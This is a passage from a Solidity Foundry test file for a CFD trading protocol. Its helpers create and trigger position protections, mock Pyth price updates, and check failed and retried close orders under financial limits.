            IL20ExpiryRouter(address(router)), protectionActions, orderId, protectionId, _unlimitedLimits()
        );
        uint256 batchGas = gasBefore - gasleft();
        console2.log("CONTRACT OWNER expire+amend+retry gas", batchGas);

        assertEq(
            protectionViews.closeFinancialLimits(protectionId).maxExecutionNotionalAssets,
            type(uint256).max,
            "contract owner amended inside the transient Latched state"
        );
        assertEq(
            router.lifecycleBook().pendingPolicy(retryId).maxExecutionNotionalAssets,
            type(uint256).max,
            "new child uses amended limits"
        );
        _assertStillTriggeredWithPosition(account, protectionId);

        bytes[] memory executionData = _mockPythUpdateData(RECOVERY_PRICE);
        vm.prank(EXECUTION_KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(retryId, executionData);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "batched owner escape closes");
        assertEq(_positionSize(account), 0);
        assertEq(protectionViews.activePositionProtectionId(account), 0);
    }

    function _latchedRealisticFixture(address account) internal returns (uint64 protectionId, uint64 lastOrderId) {
        _open(account, CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, MARK_PRICE);
        PositionProtectionTypes.PositionProtectionParams memory params = _realisticParams();
        vm.prank(account);
        protectionId = protectionActions.createPositionProtection(params);

        lastOrderId = _triggerAt(protectionId, TRIGGER_PRICE);
        bytes[] memory executionData = _mockPythUpdateData(RECOVERY_PRICE);
        vm.prank(EXECUTION_KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(lastOrderId, executionData);
        _assertRealisticFailure(result, protectionId);

        vm.prank(HONEST_KEEPER);
        lastOrderId = protectionActions.retryPositionProtectionClose(protectionId);
        executionData = _mockPythUpdateData(RECOVERY_PRICE);
        vm.prank(EXECUTION_KEEPER);
        result = router.executeOrder(lastOrderId, executionData);
        _assertRealisticFailure(result, protectionId);
    }

    function _assertRealisticFailure(
        OrderV3Types.ExecutionResult memory result,
        uint64 protectionId
    ) internal view {
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Failed), "realistic ceiling rejects close");
        assertEq(
            uint8(result.terminalReason),
            uint8(OrderV3Types.TerminalReason.ConstraintViolation),
            "failure is a typed financial constraint"
        );
        assertEq(
            uint8(protectionViews.getPositionProtection(protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Latched),
            "failed close relatches"
        );
    }

    function _realisticParams()
        internal
        pure
        returns (PositionProtectionTypes.PositionProtectionParams memory params)
    {
        params.takeProfitTriggerPrice = TRIGGER_PRICE;
        params.stopLossTriggerPrice = 0;
        params.closeLimits = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: REALISTIC_NOTIONAL_CEILING,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });
    }

    function _unlimitedLimits()
        internal
        pure
        returns (PositionProtectionTypes.CloseFinancialLimits memory limits)
    {
        limits = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });
    }

    function _boundedRequest(uint256 size, bool isClose) internal view returns (OrderV3Types.OrderRequest memory request) {
        request.clientOrderId = bytes32(uint256(router.nextCommitId()));
        request.side = CfdTypes.Side.LONG;
        request.sizeDelta = size;
        request.marginDelta = isClose ? 0 : 100e6;
        request.targetPrice = isClose ? engine.CAP_PRICE() : 1;
        request.isClose = isClose;
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(block.timestamp) + uint64(router.maxExecutionWindowSeconds()),
            executionWindowSeconds: uint32(router.maxExecutionWindowSeconds()),
            allowedExecutionModes: 7,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

    function _triggerAt(uint64 protectionId, uint256 price) internal returns (uint64 linkedOrderId) {
        _mockPythUpdateData(price);
        bytes[] memory updateData = _livePriceData(price);
        vm.prank(TRIGGER_KEEPER);
        linkedOrderId = protectionActions.triggerPositionProtection(protectionId, updateData);
    }

    function _refreshMark(uint256 price) internal {
        if (block.timestamp <= engine.lastMarkTime()) {
            uint256 t = uint256(engine.lastMarkTime()) + 1;
            vm.warp(t);
            assertEq(block.timestamp, t);
        }
        router.updateMarkPrice(_livePriceData(price));
    }

    function _livePriceData(uint256 price) internal view returns (bytes[] memory updateData) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        uint256 previous = engine.lastMarkTime();
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] = MockPyth.FeedUpdate(
                ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, -8, block.timestamp, previous)
            );
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(ticks);
    }

    function _warpPastDeadline(uint64 orderId) internal {
        uint256 t = uint256(router.lifecycleBook().orderTiming(orderId).executionDeadline) + 1;
        uint256 currentTime = vm.getBlockTimestamp();
        if (t <= currentTime) t = currentTime + 1;
        vm.warp(t);
        assertEq(block.timestamp, t);
    }

    function _assertStillTriggeredWithPosition(address account, uint64 protectionId) internal view {
        assertEq(_positionSize(account), POSITION_SIZE);
        assertEq(router.pendingOrderCounts(account), 1);
        assertEq(
            uint8(protectionViews.getPositionProtection(protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered)
        );
    }

    function _positionSize(address account) internal view returns (uint256 size) {
        (size,,,,,,) = engine.positions(account);
    }

    function _positionMargin(address account) internal view returns (uint256 margin) {
        (, margin,,,,,) = engine.positions(account);
    }
}

```
